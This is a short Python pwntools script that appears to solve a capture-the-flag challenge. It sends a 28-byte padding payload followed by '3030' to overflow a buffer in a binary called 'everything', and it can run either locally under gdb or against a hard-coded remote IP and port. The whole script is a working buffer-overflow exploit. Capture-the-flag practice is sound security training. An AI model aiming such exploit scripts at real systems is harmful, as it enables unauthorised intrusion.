from pwn import *

binary = './everything'
elf = context.binary = ELF(binary,checksec=True)

gdbscript = '''
b *0x00000000004011b1
'''.format(**locals())

if 'remote' in sys.argv:
    p = remote('34.124.192.13', 60640)
else:
    p = process(binary)
    if 'gdb' in sys.argv:
        gdb.attach(p, gdbscript=gdbscript)

p.recv()

payload = b'a'*28
payload+= b'3030'

print(payload)


p.sendline(payload)

p.interactive()
